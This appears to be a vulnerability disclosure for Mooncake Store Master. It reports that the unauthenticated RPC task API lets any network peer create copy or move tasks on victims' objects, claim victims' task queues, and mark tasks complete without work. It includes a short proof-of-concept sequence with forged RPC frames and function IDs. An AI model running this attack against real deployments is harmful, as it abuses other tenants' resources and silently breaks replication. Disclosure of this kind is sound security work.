The replication/migration task system of Mooncake Store Master is exposed on the unauthenticated RPC port (default 0.0.0.0:50051) without caller validation. `CreateCopyTask`/`CreateMoveTask` accept any object key and attacker-chosen target segments and assign the resulting work to the owner of the source segment; `FetchTasks` hands out task queues based on a self-declared client_id; `MarkTaskToComplete` closes a task when the caller claims that same client_id. Together this gives an unauthenticated peer three primitives: force real transfer work onto a victim, steal a victim's task queue, and mark tasks successful without any work. Runtime-confirmed on the master binary shipped in the 0.3.13.post1 wheel (latest release); no fix available. Suggested severity: High, CVSS 8.2.

### Details

`MasterService::CreateCopyTask(key, targets)` (mooncake-store/src/master_service.cpp) validates only that each target segment exists and is allocatable. It never checks who owns `key`: it looks up the victim object's metadata, picks a source replica, resolves the source segment's owner via `GetClientIdBySegmentName`, and submits the task assigned to that owner's client_id. `CreateMoveTask` behaves the same. So any caller decides which object is replicated or moved and into which segments, and the work lands in the victim's queue.

The task store (mooncake-store/src/task_manager.cpp) keys everything on a caller-supplied UUID: `pop_tasks(client_id, batch)` returns the pending queue of whatever client_id the request names, and `complete_task(client_id, task_id, ...)` succeeds whenever `task.assigned_client == client_id` from the request. No authentication binds the claimed identity to the connection. `QueryTask(task_id)` returns the full task record including `assigned_client`, so the needed victim client_id comes from the same unauthenticated API.

Runtime-verified on 0.3.13.post1 (frames forged over coro_rpc, same transport as the Remove issue): a task created with `CreateCopyTask(victim_key, [attacker_segment])` was assigned to the victim's client_id — the returned task payload names the victim's segment as source and the attacker's segment as target; `FetchTasks` claiming the victim's client_id handed the task to the attacker; `MarkTaskToComplete` then flipped it to SUCCESS two milliseconds after creation, before any copy RPC could occur (the task had also left the victim's pending queue via the theft, so the victim's worker could no longer pick it up).

### PoC

Environment as for the Remove report: the 0.3.13.post1 wheel's `mooncake_master` on 0.0.0.0:50051, a victim store client with segment `seg_victim` holding object `victim_task_key`, and an attacker store client with its own segment `seg_attacker`. The attacker forges coro_rpc frames (20-byte header, magic=21; struct_pack bodies captured once by proxying a legit client, then replayed with patched fields; observed function_ids: CreateCopyTask=2013387680, QueryTask=125921908, FetchTasks=3742636100, MarkTaskToComplete=2802188309):

```python
task_id = call(CreateCopyTask, key="victim_task_key", tenant="default",
               targets=["seg_attacker"])          # succeeds, returns task UUID
task = call(QueryTask, task_id=task_id)            # assigned_client == victim's UUID
tasks = call(FetchTasks, client_id=<victim_uuid>, batch=16)   # queue stolen
call(MarkTaskToComplete, client_id=<victim_uuid>, task_id=task_id,
     status=SUCCESS, message="")                   # no data ever moved
task2 = call(QueryTask, task_id=task_id)           # status == SUCCESS
```

Observed: each step returns success; the final QueryTask reports SUCCESS although the task was created two milliseconds earlier and no copy RPC ever ran. The task payload returned by FetchTasks is `{"tenant_id":"default","key":"victim_task_0001","source":"<victim segment>","targets":["<attacker segment>"],...}`, confirming both the forced assignment and the attacker-directed target. Expected secure behavior: task creation requires ownership of the key, and fetching/completing requires an authenticated identity matching the assignee.

### Impact

Any network peer that can reach the master RPC port, without credentials: (1) submits copy/move tasks for arbitrary victims' objects — the victim's client picks them up and performs real data transfers, so an attacker drives other tenants' CPU and network at zero cost, with attacker-chosen targets including the attacker's own segments; (2) claims a victim's queue with the self-declared client_id, stalling the victim's migration and offload; (3) marks tasks successful without work, so replication the system believes happened never did — silent failure of the data-protection goal. Availability and integrity of the replication subsystem are affected; no confidentiality effect was demonstrated in this report. Suggested CVSS:3.1 vector AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H (8.2), CWE-862. Affected: mooncake-store master <= 0.3.13.post1 (latest release), no patched version yet.
